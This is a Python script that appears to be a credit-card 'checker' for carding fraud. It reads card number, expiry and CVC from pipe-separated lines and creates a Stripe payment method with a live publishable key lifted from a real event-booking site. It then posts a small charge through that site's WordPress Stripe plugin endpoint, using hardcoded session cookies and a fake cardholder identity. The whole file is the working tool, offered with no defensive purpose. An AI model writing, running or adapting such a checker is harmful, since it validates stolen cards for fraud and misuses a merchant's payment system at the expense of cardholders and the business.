import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fbenidormevents.com&time_on_page=210818&key=pk_live_51MnlD9BLnG0DgrS7dg4xwTw7EJPH5l3oBUk9sVl3x7MFDTVXdayD9ilvN72iuWvfOhzzJbpP2xZ4ZMMj8UvMoZpV00ndaL2EFc'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'PHPSESSID': '1a56f275fbe4975c11b5b2574952dd7a',
	    '_ga_PJ9MDRD997': 'GS1.1.1735920393.1.0.1735920393.0.0.0',
	    '_ga': 'GA1.1.1846511171.1735920393',
	    'cookieyes-consent': 'consentid:TGVWbW9zOXZmUG1CcXdkSGVkaEtkb2R0enNRZVVNMWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
	    '__stripe_mid': '38235fd5-3f79-4ac7-a041-c2fcee1efadab88319',
	    '__stripe_sid': 'd8771e80-f795-4c14-9289-4cc6b9659e9aa327c0',
	}
	
	headers = {
	    'authority': 'benidormevents.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'PHPSESSID=1a56f275fbe4975c11b5b2574952dd7a; _ga_PJ9MDRD997=GS1.1.1735920393.1.0.1735920393.0.0.0; _ga=GA1.1.1846511171.1735920393; cookieyes-consent=consentid:TGVWbW9zOXZmUG1CcXdkSGVkaEtkb2R0enNRZVVNMWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; __stripe_mid=38235fd5-3f79-4ac7-a041-c2fcee1efadab88319; __stripe_sid=d8771e80-f795-4c14-9289-4cc6b9659e9aa327c0',
	    'origin': 'https://benidormevents.com',
	    'pragma': 'no-cache',
	    'referer': 'https://benidormevents.com/payments',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_payment_charge',
	    'wpfs-form-name': 'MakeAPayment',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-custom-input[]': [
	        '1',
	        '1',
	        '10080',
	    ],
	    'wpfs-card-holder-email': 'rodamuser09@gmail.com',
	    'wpfs-card-holder-name': 'Rodam User',
	    'wpfs-stripe-payment-method-id': pm,
	}
	
	r2 = requests.post('https://benidormevents.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
